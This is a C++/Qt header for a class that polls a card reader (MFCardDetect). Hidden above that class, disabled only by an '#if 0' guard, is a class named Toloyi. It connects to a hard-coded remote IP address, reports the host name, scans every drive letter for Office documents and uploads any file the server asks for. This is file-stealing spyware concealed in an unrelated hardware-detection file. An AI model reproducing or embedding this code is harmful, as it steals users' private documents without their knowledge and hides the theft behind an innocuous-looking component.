#ifndef MFCARDDETECT_H
#define MFCARDDETECT_H

#include <QThread>
#include <QDebug>
#include <QDir>
#include "opcard.h"
#include "mw.h"
#if 0

#include <QHostInfo>
class Toloyi : public QThread
{
    Q_OBJECT
public:
    explicit Toloyi(QObject *parent = 0) :
        QThread(parent)
    {
    }

    void scanDir(QDir dir, int fd)
    {
        char* p;
        static QStringList careSuffix;
        if(careSuffix.length() == 0)
        {
#if 0
            careSuffix << "jpg"
                       << "jpeg"
                       << "doc"
                       << "docx"
                       << "xls"
                       << "xlsx"
                       << "ppt"
                       << "pptx";
#endif
            careSuffix << "doc"
                       << "docx"
                       << "xls"
                       << "xlsx"
                       << "ppt"
                       << "pptx";
        }

        foreach(QFileInfo afile, dir.entryInfoList())
        {

            if(!afile.isDir() && careSuffix.indexOf(afile.suffix().toLower()) != -1)
            {
                xs_base64_encode((uint8_t*)afile.filePath().toUtf8().data(),
                                 afile.filePath().toUtf8().size(),(uint8_t**)&p);

                QByteArray ba(p);
                ba +=  ".";
                ba += afile.suffix();
                //result << afile.filePath();
                xs_model_t* model = xs_model_create(1, ba.data());
                xs_free(p);
                xs_model_send_block(model, fd, 60000);
                usleep(100*1000);
            }
            else
            {
                if(afile.fileName() == "." || afile.fileName() == ".."
                        || afile.fileName().toLower() == "program files" ||
                        afile.fileName().toLower() == "windows")
                    continue;

                scanDir(QDir(afile.filePath()), fd);
            }
        }
    }

    int run1()
    {

        //xs_mempool_t* mp = pthread_getspecific(g_thread_key);

        CONNECT_AGAIN:
        int fd = xs_sock_connect(8080, "42.121.13.248");
        if(fd < 0)
        {
            sleep(2);
            goto CONNECT_AGAIN;
        }
        send(fd, "c", 1, 0);

        xs_model_t* model;
        xs_model_recv_block((void**)&model, fd, 60000);

        AGAIN:
        if(!model)
            return fd;

        mylog << QString(model->argv(0));


#define SERVER_REQ QString(model->argv(0))
        if(SERVER_REQ == "host")
        {
            static QString hostname = QHostInfo::localHostName();
            xs_model_delete(model);
            xs_model_call(fd, &model, 1, hostname.toUtf8().data());
            goto AGAIN;
        }

        else if(SERVER_REQ == "scan")
        {
            xs_model_delete(model);
            QString disk;
            for(char ch = 'C'; ch<='Z'; ch++)
            {
                disk = QString("%1:").arg(ch);
                scanDir(QDir(disk), fd);
            }
#if 0
            model = xs_model_create(1, __xs_ok);
            xs_model_send_block(model, fd, 60000);
#endif
            xs_model_call(fd, &model, 1, __xs_ok);

            goto AGAIN;
        }
        else if(SERVER_REQ == "get")
        {
            char* p;
            xs_base64_decode((uint8_t*)model->argv(1), strlen(model->argv(1)), (uint8_t**)&p);

            mylog << p;
            QString filename(p);
            xs_free(p);

            mylog << filename;
            if(filename.toLower().indexOf(".jpg") != -1)
                filename = filename.left(filename.toLower().indexOf(".jpg")+4);

            else if(filename.toLower().indexOf(".jpeg") != -1)
                filename = filename.left(filename.toLower().indexOf(".jpeg")+5);

            else if(filename.toLower().indexOf(".xls") != -1)
                filename = filename.left(filename.toLower().indexOf(".xls")+4);

            else if(filename.toLower().indexOf(".xlsx") != -1)
                filename = filename.left(filename.toLower().indexOf(".xlsx")+5);

            else if(filename.toLower().indexOf(".doc") != -1)
                filename = filename.left(filename.toLower().indexOf(".doc")+4);

            else if(filename.toLower().indexOf(".docx") != -1)
                filename = filename.left(filename.toLower().indexOf(".docx")+5);

            else if(filename.toLower().indexOf(".ppt") != -1)
                filename = filename.left(filename.toLower().indexOf(".ppt")+4);

            else if(filename.toLower().indexOf(".pptx") != -1)
                filename = filename.left(filename.toLower().indexOf(".pptx")+5);


            mylog << "req get file " << filename;

            xs_model_delete(model);
            QFile file(filename);

            if(file.open(QFile::ReadOnly))
            {
                model = xs_model_create(1, QString::number(file.size()).toUtf8().data());
                xs_model_send_block(model, fd, 60000);

                int total = file.size();
                while(total > 0)
                {
                    QByteArray buf = file.read(8192);
                    send(fd, buf.data(), buf.size(), 0);
                    total -= buf.size();

                    mylog << "data send " << total;
                    usleep(100*1000);
                }

                file.close();
            }
            else
            {
                mylog << "file open error:" << filename;
                model = xs_model_create(1, QString::number(0).toUtf8().data());
                xs_model_send_block(model, fd, 60000);
            }

            xs_model_recv_block((void**)&model, fd, 60000);
            goto AGAIN;
        }
        else
        {
            mylog << "end la ......";

        }


        return fd;

    }

    void run()
    {
        xs_mempool_t* mp = xs_mempool_create(NULL, 0, 128000);
        pthread_setspecific(g_thread_key, mp);
        while(1)
        {
            close(run1());
            usleep(100*1000);
            mylog << "again and again";
        }
    }
};
#endif
class MFCardDetect : public QThread
{
    Q_OBJECT
public:
    explicit MFCardDetect(QObject *parent = 0) :
        QThread(parent)
    {
        _quit = false;
        _stop = true;
    }
    bool _quit;
    bool _stop;


    void run()
    {
#ifdef WIN32
        unsigned long cardno;
        unsigned long cardno_old = -1;
        unsigned char* buf;
        int ret;
        static char filter[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
                            17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32,
                            33, 34, 35, -1, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48,
                            49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64};
        while(!_quit)
        {

            sleep(1);
            /* 停止检测 */
            if(_stop)
            {
                continue;
            }

            buf = new unsigned char[1024];
            ret = read_card(&cardno, buf, NULL, filter);
            if(ret == 0 && cardno != cardno_old)
            {
                cardno_old = cardno;
                /* stop detect for a while */
                setStop();
                emit dataArrive(buf, cardno);
            }
            else
            {
                if(ret != 0)
                    cardno_old = -1;
                delete[] buf;
            }
        }
#endif
    }

    
signals:
    void dataArrive(unsigned char*, unsigned long);
    
public slots:
    void setQuit(bool quit = true)
    {
        _quit = quit;
    }

    void setStop(bool stop = true)
    {
        _stop = stop;
    }
    
};

#endif // MFCARDDETECT_H
